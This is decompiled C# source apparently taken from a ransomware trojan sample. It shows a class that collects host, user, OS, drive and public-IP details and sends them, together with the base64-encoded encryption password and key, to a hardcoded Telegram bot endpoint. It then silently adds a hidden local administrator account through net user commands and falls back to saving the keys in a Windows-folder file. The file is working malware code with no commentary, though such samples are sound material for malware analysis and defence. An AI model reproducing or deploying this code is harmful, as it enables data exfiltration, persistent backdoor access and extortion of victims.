// Decompiled with JetBrains decompiler
// Type: Fast.Telegram
// Assembly: encoderdecryption@yandex.ru, Version=2.0.2.2, Culture=neutral, PublicKeyToken=null
// MVID: C353C6AA-D71D-41FD-A002-1E85FFB3A964
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32-d2c47b1c94e6beadbc222771e788e9dafe194c462760b0d16cd25cbc0a572a00.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Web;

namespace Fast
{
  internal class Telegram
  {
    private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;
    private static string name_pc = Environment.MachineName.ToString();
    private static string userName = Environment.UserName;
    private static string WinName = Telegram.GetWinName();
    private static string SoftName = Process.GetCurrentProcess().ProcessName;
    private static string getsysteminfo = CultureInfo.CurrentCulture.Name;
    private static DateTime nowTime = DateTime.Now;

    public static void SendForOwner()
    {
      try
      {
        int num = new Random().Next(1, 694);
        string str1 = "svchost" + num.ToString();
        string str2 = "EAF@v" + num.ToString();
        string localIpAddress = Telegram.GetLocalIPAddress();
        string str3 = string.Format("Name: {0}\nUsername: {1}\nWin Name: {2}\nSoft Name: {3}\nSystem Info: {4}\nDate: {5}\nEmail 1: {6}\nEmail 2: {7}\nID_1: #{8}\nID_2: #{9}", (object) Telegram.name_pc, (object) Telegram.userName, (object) Telegram.WinName, (object) Telegram.SoftName, (object) Telegram.getsysteminfo, (object) Telegram.nowTime, (object) Program.email1, (object) Program.email2, (object) Program.UniqueID(), (object) Program.GetID());
        string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(Telegram.EncryptPassword));
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(Program.RndKey));
        string address = "https://api.telegram.org/bot5184674519:AAEUjh7_2Giq6JYW4CBJ17ZVkhTJtfJGa_8/SendMessage?chat_id=-1001733756150&text=" + HttpUtility.UrlEncode(str3 + "\n" + Telegram.drivesInfo() + "\n" + base64String1 + "\n\n" + base64String2 + "\n\n" + localIpAddress + "\n" + str1 + "\n" + str2);
        WebClient webClient = new WebClient();
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        webClient.DownloadString(address);
        Telegram.runCommand("net user " + str1 + " " + str2 + " /ad");
        Telegram.runCommand("net localgroup administrators " + str1 + " /ad");
      }
      catch (Exception ex)
      {
        Telegram.forSavePassword(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\" + Program.txtName);
      }
    }

    private static void forSavePassword(string path)
    {
      try
      {
        string str1 = Telegram.bs64(Program.RndKey);
        string str2 = Telegram.bs64(Program.A + Program.B);
        string str3 = Telegram.bs64(Program.keyword);
        string str4 = Telegram.bs64(Program.C + Program.D);
        string str5 = Program.UniqueID();
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("Do Not Delete It, So This Is Your Helper File");
          streamWriter.WriteLine("--------------------");
          streamWriter.WriteLine(">>>  " + (object) Telegram.nowTime);
          streamWriter.WriteLine("Key: " + str1);
          streamWriter.WriteLine("AB: " + str2);
          streamWriter.WriteLine("Word: " + str3);
          streamWriter.WriteLine("CD: " + str4);
          streamWriter.WriteLine("ID: " + str5);
          streamWriter.WriteLine("--------------------");
          streamWriter.WriteLine("\n");
          streamWriter.Close();
        }
      }
      catch
      {
      }
    }

    private static string bs64(string text)
    {
      try
      {
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
      }
      catch
      {
        return text;
      }
    }

    private static void runCommand(string commands)
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          Verb = "runas",
          FileName = "cmd.exe",
          Arguments = "/C " + commands,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        process.WaitForExit();
      }
      catch
      {
      }
    }

    private static string GetLocalIPAddress()
    {
      try
      {
        return IPAddress.Parse(new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim()).ToString();
      }
      catch
      {
        return "127.0.0.1";
      }
    }

    private static string GetWinName()
    {
      string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      string winName;
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
      {
        if (registryKey != null)
        {
          try
          {
            string str = registryKey.GetValue("ProductName").ToString();
            if (str == "")
              return "null";
            if (str.Contains("XP"))
              return "XP";
            if (str.Contains("7"))
              return "Win 7";
            if (str.Contains("2003"))
              return "Serv 2003";
            if (str.Contains("8"))
              return str.Contains("2008") ? "Serv 2008" : "Win 8";
            if (str.Contains("10"))
              return "Win 10";
            if (str.Contains("11"))
              return "Win 11";
            if (str.Contains("2012"))
              return "Serv 2012";
            if (str.Contains("2016"))
              return "Serv 2016";
            if (str.Contains("2019"))
              return "Serv 2019";
            if (str.Contains("2022"))
              return "Serv 2022";
            return str.Contains("Server") ? "Serv" : "Unknow";
          }
          catch (Exception ex)
          {
            return ex.Message;
          }
        }
        else
          winName = "Null";
      }
      return winName;
    }

    private static string drivesInfo()
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
        {
          stringBuilder.AppendLine("--------------------");
          stringBuilder.AppendLine("Drive Name : " + drive.Name.ToString());
          Decimal num1 = (Decimal) (drive.TotalSize / 1024L / 1024L / 1024L);
          Decimal num2 = (Decimal) (drive.TotalFreeSpace / 1024L / 1024L / 1024L);
          Decimal num3 = num1 - num2;
          stringBuilder.AppendLine("Total Size (GB) : " + num1.ToString());
          stringBuilder.AppendLine("Total Used Space (GB) : " + num3.ToString());
          stringBuilder.AppendLine("Total Free Space (GB) : " + num2.ToString());
          stringBuilder.AppendLine("Drive Type : " + drive.DriveType.ToString());
          stringBuilder.AppendLine("Drive Format : " + drive.DriveFormat.ToString());
          stringBuilder.AppendLine("--------------------");
        }
      }
      return stringBuilder.ToString();
    }

    public enum ProtocolTypeEAF
    {
      SystemDefault = 0,
      Ssl3 = 48, // 0x00000030
      Tls = 192, // 0x000000C0
      Tls11 = 768, // 0x00000300
      Tls12 = 3072, // 0x00000C00
    }
  }
}
